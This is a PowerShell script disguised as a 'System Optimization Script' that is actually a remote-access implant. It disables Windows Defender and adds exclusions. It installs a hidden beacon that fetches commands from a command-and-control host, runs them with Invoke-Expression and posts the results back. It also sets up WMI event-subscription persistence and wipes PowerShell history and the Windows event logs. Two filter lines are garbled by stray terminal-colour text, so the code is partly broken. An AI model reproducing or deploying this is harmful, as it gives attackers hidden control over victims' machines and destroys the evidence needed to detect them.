# System Optimization Script - DO NOT MODIFY
$ErrorActionPreference = 'SilentlyContinue'

# Configuration
$C2_URL = 'https://readme.workers.dev'
$VICTIM_ID = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_})

# Disable Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true -EnableControlledFolderAccess Disabled -Force 2>$null
Start-Sleep 2

# Add exclusions
$ExclusionPaths = @(
    'C:\ProgramData\Microsoft\Network',
    'C:\Windows\Temp',
    'C:\Users\Public'
)

foreach ($path in $ExclusionPaths) {
    Add-MpPreference -ExclusionPath $path -Force 2>$null
}

Add-MpPreference -ExclusionProcess 'powershell.exe' -Force 2>$null

# Create beacon script
$BeaconScript = @"
while (\$true) {
    try {
        \$headers = @{
            'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            'X-Victim-ID' = ''
        }
        
        # Beacon to C2
        \$cmd = Invoke-WebRequest -Uri 'https://readme.workers.dev/beacon' -Headers \$headers -UseBasicParsing | Select-Object -ExpandProperty Content
        
        if (\$cmd -and \$cmd -ne 'idle') {
            # Execute command
            \$output = Invoke-Expression \$cmd 2>&1 | Out-String
            
            # Send result
            Invoke-WebRequest -Uri 'https://readme.workers.dev/result' -Method POST -Headers \$headers -Body \$output -UseBasicParsing | Out-Null
        }
    } catch {
        # Silent fail
    }
    
    Start-Sleep 60
}
"@

# Install beacon
$BeaconPath = 'C:\ProgramData\Microsoft\Network\netbeacon.ps1'
$BeaconDir = Split-Path $BeaconPath

if (!(Test-Path $BeaconDir)) {
    New-Item -ItemType Directory -Path $BeaconDir -Force | Out-Null
}

Set-Content -Path $BeaconPath -Value $BeaconScript -Force
attrib +h +s $BeaconPath

# WMI Persistence
$CMD = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File $BeaconPath"
$FilterName = 'NetworkOptimizationService'
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

# Remove existing
gwmi -Namespace root\subscription -Class __EventFilter -Filter "Name='$FilterName'" | Remove-WmiObject 2>$null
gwmi -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$FilterName'" | Remove-WmiObject 2>$null

# Create new persistence
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = $FilterName
    EventNameSpace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = $Query
}

$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = $FilterName
    CommandLineTemplate = $CMD
    RunInteractively = $false
}

$FilterObj = gwmi -Namespace root\subscription -Class __EventFilter | Where-Object {\\033[0;36m[*] Step 3/6: Creating PowerShell payload...\033[0m.Name -eq $FilterName}
$ConsumerObj = gwmi -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {\\033[0;36m[*] Step 3/6: Creating PowerShell payload...\033[0m.Name -eq $FilterName}

Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $FilterObj
    Consumer = $ConsumerObj
} | Out-Null

# Start beacon immediately
Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File $BeaconPath" -WindowStyle Hidden

# Clean traces
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force 2>$null
Clear-History 2>$null
wevtutil cl System 2>$null
wevtutil cl Application 2>$null
wevtutil cl 'Windows PowerShell' 2>$null
